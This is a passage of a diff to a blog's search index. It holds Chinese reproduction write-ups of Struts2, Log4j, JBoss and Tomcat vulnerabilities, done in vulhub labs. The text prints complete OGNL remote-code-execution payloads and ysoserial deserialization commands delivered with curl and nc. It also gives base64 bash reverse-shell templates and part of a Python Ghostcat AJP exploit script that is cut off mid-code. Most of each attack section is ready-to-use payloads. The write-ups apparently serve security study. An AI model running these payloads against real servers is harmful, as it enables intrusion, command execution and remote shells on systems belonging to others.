-<p>将 http://公网地址: 8081/上传的文件名.jsp 放到哥斯拉连接</p>
-<p><img src="/2026/02/25/CVE-2017-12615/1773153909466.png" alt="1773153909466"></p>
-<h2 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h2><ol>
-<li><strong>升级版本</strong>：升级到 Apache Tomcat 7.0.80 或更高版本</li>
-<li><strong>保持默认配置</strong>：保持 readonly = true 配置（默认值）</li>
-<li><strong>限制 HTTP 方法</strong>：在 Web 服务器或应用层限制 PUT 方法的使用</li>
-<li><strong>文件系统权限</strong>：严格控制 Tomcat 目录的写入权限</li>
-<li><strong>WAF 防护</strong>：部署 Web 应用防火墙，拦截可疑的文件上传请求</li>
-</ol>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>CVE-2017-12615 是一个影响 Apache Tomcat 7.0.0-7.0.79 版本的任意文件写入漏洞，仅在 Windows 操作系统上存在。该漏洞利用 Windows 文件系统的特性，通过在文件名后添加特殊字符（如斜杠、空格、::$DATA）来绕过 Tomcat 的文件扩展名检查，从而上传恶意 JSP 文件。</p>
-<p>修复该漏洞的最佳方法是升级到最新版本的 Tomcat，并保持 readonly = true 的默认配置。同时，加强服务器的访问控制和监控，及时发现并阻止可疑的文件上传行为。</p>
+<p><img src="/2026/02/04/CVE-2017-5638/1773317824744.png" alt="1773317824744"></p>
+<p>发送后，响应码为 200，且执行了命令 id</p>
+<p><img src="/2026/02/04/CVE-2017-5638/1773317875838.png" alt="1773317875838"></p>
 ]]></content>
       <categories>
         <category>漏洞</category>
       </categories>
       <tags>
         <tag>CVE</tag>
-        <tag>Tomcat</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Log4j 反序列化命令执行漏洞 CVE-2017-5645</title>
+    <url>/2026/02/08/CVE-2017-5645/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Apache Log4j 2.0-alpha1 - 2.8.1</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Java 反序列化</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
+<li>启动 Log4j 的 TcpSocketServer 服务，监听 4712 端口（也可指定其他端口）</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell，植入木马</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Log4j 的 TcpSocketServer 和 UdpSocketServer 类中，在接收日志数据时，没有对数据进行安全检验，直接通过 ObjectInputSteam.readObject() 进行反序列化，攻击者可以构造被序列化的恶意对象链来实现命令执行</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/log4j/CVE-2017-5645</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2017-5645/1773547936873.png" alt="1773547936873"></p>
+<p>扫描靶机端口 4712，用 telnet 连接成功连接，说明端口开放</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">telnet 公网ip 被扫描端口</span><br><span class="line">nc -zv 公网ip 被扫描端口</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2017-5645/1773547983473.png" alt="1773547983473"></p>
+<p>下载攻击工具并检查是否有 Java 环境</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br><span class="line">#检查Java环境</span><br><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2017-5645/1773548027183.png" alt="1773548027183"></p>
+<p>使用工具工具构造 payload，这里执行 touch /tmp/success</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar 利用的攻击链（这里用CommonsCollection6，） "执行的命令" &gt; 文件名.bin</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2017-5645/1773548059369.png" alt="1773548059369"></p>
+<p>使用 nc 将二进制文件传到靶机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nc -v 靶机ip 4712 &lt; 工具构造的文件名.bin</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2017-5645/1773548115605.png" alt="1773548115605"></p>
+<p>进入容器查看 /tmp，发现存在 success，说明成功执行命令</p>
+<p><img src="/2026/02/08/CVE-2017-5645/1773548142489.png" alt="1773548142489"></p>
+<p>进行反弹 shell，使用 nc，nc -lvvp 监听端口</p>
+<p><img src="/2026/02/08/CVE-2017-5645/1773548171530.png" alt="1773548171530"></p>
+<p>构造攻击 payload，将执行命令替换成下面这条</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/08/CVE-2017-5645/1773548204015.png" alt="1773548204015"></p>
+<p>用 nc 将二进制文件传入靶机</p>
+<p><img src="/2026/02/08/CVE-2017-5645/1773548245345.png" alt="1773548245345"></p>
+<p>成功连接</p>
+<p><img src="/2026/02/08/CVE-2017-5645/1773548278116.png" alt="1773548278116"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Log4j</tag>
       </tags>
   </entry>
   <entry>
@@ -269,34 +394,30 @@
       </tags>
   </entry>
   <entry>
-    <title>Struts2 远程代码执行漏洞 CVE-2017-5638</title>
-    <url>/2026/02/04/CVE-2017-5638/</url>
+    <title>Struts2 远程命令执行漏洞 CVE-2016-3081</title>
+    <url>/2026/02/03/CVE-2016-3081/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.3.5 – 2.3.31</li>
-<li>Struts 2.5 – 2.5.10</li>
+<li>Struts 2.3.18 - 2.3.28（不包括 2.3.20.2 和 2.3.24.2）</li>
 </ul>
 <h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
 <h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
 <h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>漏洞产生主要原因是 Struts2 有一个复杂功能，给错误信息赋动态变量，构造的 payload 通过错误信息进入到动态变量，后续通过动态变量抛出报错信息同时执行敏感命令。Struts2 默认使用 Jakarta 库来解析上传文件，通过构造异常的 Content-Type，Jakarta 解析器无法识别并抛出该字符串错误，Struts2 将错误转化为可读错误提示，findText () 函数解析时候，错误信息内有 %(# 符号，识别为需要计算的表达式，OGNL 引擎解析并执行括号里面的 Java 代码，即敏感命令</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在配置文件 struts.xml 开启了 devMode（开发者模式），其中允许通过 method 前缀来动态执行 Action 方法。Struts2 内部存在一个安全沙盒，默认禁止执行危险的 Java 方法，为允许调用执行系统命令所需 Java 类，将上下文访问权限重置为默认，payload 片段为 #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS。权限限制接触后，攻击者通过调用 Java 环境的 Runtime 环境执行系统级别的命令，payload 片段为 @java.lang.Runtime@getRuntime ().exec(‘id’)，其中 id 可替换成其他敏感命令  </p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-045</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-032</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
 
-<p>可以通过 docker ps 查看镜像</p>
-<p><img src="/2026/02/04/CVE-2017-5638/1773317613909.png" alt="1773317613909"></p>
-<p>用 burpsuite 抓取 http://公网: 8080 流量包</p>
-<p><img src="/2026/02/04/CVE-2017-5638/1773317657503.png" alt="1773317657503"></p>
-<p>使用 Repeater 模块</p>
-<p><img src="/2026/02/04/CVE-2017-5638/1773317777800.png" alt="1773317777800"></p>
-<p>随便添加参数</p>
-<p><img src="/2026/02/04/CVE-2017-5638/1773317706752.png" alt="1773317706752"></p>
-<p>修改 Content-Type 内容，换成下面的恶意 payload，并删掉加入的参数</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%{(#nick='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmds={'id'}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/2026/02/03/CVE-2016-3081/1773316738135.png" alt="1773316738135"></p>
+<p>用 burpsuite 抓取 http://公网: 8080/index.action 流量包</p>
+<p><img src="/2026/02/03/CVE-2016-3081/1773316931101.png" alt="1773316931101"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="/2026/02/03/CVE-2016-3081/1773316855000.png" alt="1773316855000"></p>
+<p>加上参数 payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/2026/02/04/CVE-2017-5638/1773317824744.png" alt="1773317824744"></p>
-<p>发送后，响应码为 200，且执行了命令 id</p>
-<p><img src="/2026/02/04/CVE-2017-5638/1773317875838.png" alt="1773317875838"></p>
+<p><img src="/2026/02/03/CVE-2016-3081/1773316979886.png" alt="1773316979886"></p>
+<p>成功执行命令 id</p>
+<p><img src="/2026/02/03/CVE-2016-3081/1773317026124.png" alt="1773317026124"></p>
 ]]></content>
       <categories>
         <category>漏洞</category>
@@ -355,6 +476,100 @@
       </tags>
   </entry>
   <entry>
+    <title>JBoss 反序列化漏洞 CVE-2017-7504</title>
+    <url>/2026/02/12/CVE-2017-7504/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>JBoss AS 3.2.0 - 4.2.3.GA</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>Java 反序列化</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，反弹 shell</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>JBoss AS 默认集成了一个用于 HTTP 协议传输信息的组件 JBossMQ，其组件含有一个名为 HTTPServerILServlet 的接口，该接口访问路径/jbossmq-httpil/HTTPServerILServlet 无需校验即可访问，Servlet 处理 POST 请求数据时，直接调用 readObject () 方法来反序列化数据流，且未对传入对象进行安全过滤或白名单限制，攻击者利用 yoserial 工具生成恶意系列化二进制数据，通过 HTTP 请求发送到靶机，JBoss 解析对象时自动触发对象内部嵌套的恶意代码</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/jboss/CVE-2017-7504</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/12/CVE-2017-7504/1773506967678.png" alt="1773506967678"></p>
+<p>下载攻击工具并检查是否有 Java 环境</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar</span><br><span class="line">#检查Java环境</span><br><span class="line">java -version</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/12/CVE-2017-7504/1773507049029.png" alt="1773507049029"></p>
+<p>使用 ysoserial 生成序列化数据</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 "touch /tmp/success" &gt; payload.ser</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/12/CVE-2017-7504/1773507085818.png" alt="1773507085818"></p>
+<p>用 curl 发送 payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl http://靶机ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @payload.ser</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/12/CVE-2017-7504/1773507115114.png" alt="1773507115114"></p>
+<p>进入容器查看 tmp 文件夹，发现 success，说明成功复现漏洞</p>
+<p><img src="/2026/02/12/CVE-2017-7504/1773507138029.png" alt="1773507138029"></p>
+<p>下面进行反弹 shell，开启 nc 监听</p>
+<p><img src="/2026/02/12/CVE-2017-7504/1773507180906.png" alt="1773507180906"></p>
+<p>把执行命令换成反弹 shell</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,反弹shell的base64编码}|{base64,-d}|{bash,-i}" &gt; payload.ser</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/12/CVE-2017-7504/1773507207767.png" alt="1773507207767"></p>
+<p>发送攻击 payload</p>
+<p><img src="/2026/02/12/CVE-2017-7504/1773507261832.png" alt="1773507261832"></p>
+<p>成功连接</p>
+<p><img src="/2026/02/12/CVE-2017-7504/1773507291544.png" alt="1773507291544"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>JBoss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 远程代码执行漏洞 CVE-2018-11776</title>
+    <url>/2026/02/04/CVE-2018-11776/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Struts 2.3 – 2.3.34  </li>
+<li>Struts 2.5 – 2.5.16</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
+<li>alwaysSelectFullNamespace 设置为 true</li>
+<li>package 标签未定义 namespace 或使用了通配符</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Struts2 将 URL 路径中的 namespace 当作 OGNL 表达式，在重定向跳转时对其进行二次解析，执行敏感命令。Struts2 中的 URL 结构通常为 http://域名/命名空间/Action 名.action，如果攻击者访问不存在的命名空间，且配置了 alwaysSelectFullNamespace = true，那么会将攻击者注入的 payload 提取出来，将动态变量赋值为攻击 payload，OGNL 引擎解析命名空间时候执行了恶意 payload</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-057</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2018-11776/1773323657480.png" alt="1773323657480"></p>
+<p>用 burpsuite 抓取 http://公网: 8080/struts2-showcase 数据包</p>
+<p><img src="/2026/02/04/CVE-2018-11776/1773323699382.png" alt="1773323699382">发送到 Repeater 模块<br><img src="/2026/02/04/CVE-2018-11776/1773323750416.png" alt="1773323750416"></p>
+<p>将 URL 访问改成下面 payload，即在原本基础上添加即可，这里用 ${(777 * 777)} 是为了验证漏洞，下面对 payload 的特殊符号已经进行 url 编码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/struts2-showcase/%24%7B%28777%2A777%29%7D/actionChain1.action</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2018-11776/1773323786334.png" alt="1773323786334"></p>
+<p>响应码为 302，点击跟随重定向</p>
+<p><img src="/2026/02/04/CVE-2018-11776/1773323830540.png" alt="1773323830540"></p>
+<p>原链接出现了计算结果，执行了 OGNL 表达式，说明存在注入点</p>
+<p><img src="/2026/02/04/CVE-2018-11776/1773323872780.png" alt="1773323872780"></p>
+<p>下面执行更加敏感的命令，替换掉上面 ${(777 * 777)} 的位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2026/02/04/CVE-2018-11776/1773323920618.png" alt="1773323920618"></p>
+<p>响应码 302，进行重定向</p>
+<p><img src="/2026/02/04/CVE-2018-11776/1773323963853.png" alt="1773323963853"></p>
+<p>出现敏感命令执行的结果</p>
+<p><img src="/2026/02/04/CVE-2018-11776/1773324000078.png" alt="1773324000078"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Struts2 远程代码执行漏洞 CVE-2017-9805</title>
     <url>/2026/02/04/CVE-2017-9805/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
@@ -410,510 +625,6 @@
       <tags>
         <tag>CVE</tag>
         <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Struts2 远程命令执行漏洞 CVE-2016-3081</title>
-    <url>/2026/02/03/CVE-2016-3081/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.3.18 - 2.3.28（不包括 2.3.20.2 和 2.3.24.2）</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在配置文件 struts.xml 开启了 devMode（开发者模式），其中允许通过 method 前缀来动态执行 Action 方法。Struts2 内部存在一个安全沙盒，默认禁止执行危险的 Java 方法，为允许调用执行系统命令所需 Java 类，将上下文访问权限重置为默认，payload 片段为 #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS。权限限制接触后，攻击者通过调用 Java 环境的 Runtime 环境执行系统级别的命令，payload 片段为 @java.lang.Runtime@getRuntime ().exec(‘id’)，其中 id 可替换成其他敏感命令  </p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-032</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/03/CVE-2016-3081/1773316738135.png" alt="1773316738135"></p>
-<p>用 burpsuite 抓取 http://公网: 8080/index.action 流量包</p>
-<p><img src="/2026/02/03/CVE-2016-3081/1773316931101.png" alt="1773316931101"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="/2026/02/03/CVE-2016-3081/1773316855000.png" alt="1773316855000"></p>
-<p>加上参数 payload</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/03/CVE-2016-3081/1773316979886.png" alt="1773316979886"></p>
-<p>成功执行命令 id</p>
-<p><img src="/2026/02/03/CVE-2016-3081/1773317026124.png" alt="1773317026124"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tomcat 文件包含漏洞 CVE-2020-1938</title>
-    <url>/2026/02/12/CVE-2020-1938/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Apache Tomcat 6.x (全版本受影响)</li>
-<li>Apache Tomcat 7.0.0 - 7.0.99</li>
-<li>Apache Tomcat 8.5.0 - 8.5.50</li>
-<li>Apache Tomcat 9.0.0.M1 - 9.0.30</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>二进制解析漏洞</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>8009 端口打开</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
-<li>任意文件读取，例如读取 WEB - INF / web.xml 文件，只能读取使用 AJP 目录下的文件</li>
-<li>文件包含，RCE 远程代码执行，可以是反弹 shell</li>
-</ul>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p> AJP 协议默认监听端口通常缺乏认证，利用协议缺陷，伪造 javax.servlet.include 属性</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#拉取镜像</span><br><span class="line">docker run -d -p 8082:8080 -p 8009:8009 --name ghostcat-vulhub vulhub/tomcat:9.0.30</span><br></pre></td></tr></tbody></table></figure>
-
-<p>使用云服务器：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#写入攻击脚本</span><br><span class="line">cat &lt;&lt; 'EOF' &gt; ghostcat.py</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def pack_string(s):</span><br><span class="line">    if s is None: return struct.pack('&gt;H', 0xffff)</span><br><span class="line">    b = s.encode('utf-8')</span><br><span class="line">    return struct.pack('&gt;H', len(b)) + b + b'\x00'</span><br><span class="line"></span><br><span class="line">def exploit(target_host, target_port, file_path):</span><br><span class="line">    # AJP13 Forward Request Header</span><br><span class="line">    # 0x02 = Forward Request, 0x02 = GET Method</span><br><span class="line">    data = b'\x02\x02' </span><br><span class="line">    data += pack_string("HTTP/1.1")</span><br><span class="line">    data += pack_string("/index.jsp")</span><br><span class="line">    data += pack_string("127.0.0.1")</span><br><span class="line">    data += pack_string(None)</span><br><span class="line">    data += pack_string("127.0.0.1")</span><br><span class="line">    data += struct.pack('&gt;H', 80)</span><br><span class="line">    data += b'\x00' # is_ssl: false</span><br><span class="line">    data += struct.pack('&gt;H', 0) # num_headers: 0</span><br><span class="line"></span><br><span class="line">    # 注入核心：Ghostcat 必备的三个属性</span><br><span class="line">    attrs = [</span><br><span class="line">        ("javax.servlet.include.request_uri", "/"),</span><br><span class="line">        ("javax.servlet.include.path_info", file_path),</span><br><span class="line">        ("javax.servlet.include.servlet_path", "/")</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    for name, value in attrs:</span><br><span class="line">        data += b'\x0a' # SC_A_REQ_ATTRIBUTE</span><br><span class="line">        data += pack_string(name)</span><br><span class="line">        data += pack_string(value)</span><br><span class="line">    </span><br><span class="line">    data += b'\xff' # terminator</span><br><span class="line"></span><br><span class="line">    # 封装 AJP 头部</span><br><span class="line">    header = b'\x12\x34'</span><br><span class="line">    msg_len = struct.pack('&gt;H', len(data))</span><br><span class="line">    packet = header + msg_len + data</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(5)</span><br><span class="line">        s.connect((target_host, target_port))</span><br><span class="line">        s.sendall(packet)</span><br><span class="line">        </span><br><span class="line">        print(f"[*] Attacking {target_host}:{target_port} -&gt; {file_path}")</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            res = s.recv(8192)</span><br><span class="line">            if not res: break</span><br><span class="line">            # 过滤掉 AJP 